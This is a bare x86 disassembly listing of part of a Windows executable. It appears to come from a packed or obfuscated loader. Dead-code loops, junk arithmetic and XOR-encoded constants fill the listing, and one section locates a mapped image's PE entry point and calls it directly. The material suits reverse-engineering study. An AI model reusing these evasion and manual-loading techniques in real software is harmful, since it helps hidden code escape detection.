  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d4ec,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d3dc
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ffb1
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d3dc
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d5d8
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d3dc
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d5d8,eax
  41095e:	mov    eax,ds:0x41d3dc
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d3dc
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d260,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d4b4,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d260
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d3dc
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d4b4
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d260
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d3dc
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d3dc
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d460,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d458,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d3dc
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff8d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d25c
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d464
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d3dc
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ffef
  410dc5:	push   0x41ffd1
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d3fc
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d352
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d1f8
  411086:	mov    ebx,DWORD PTR ds:0x41d1fc
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41ff2e
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
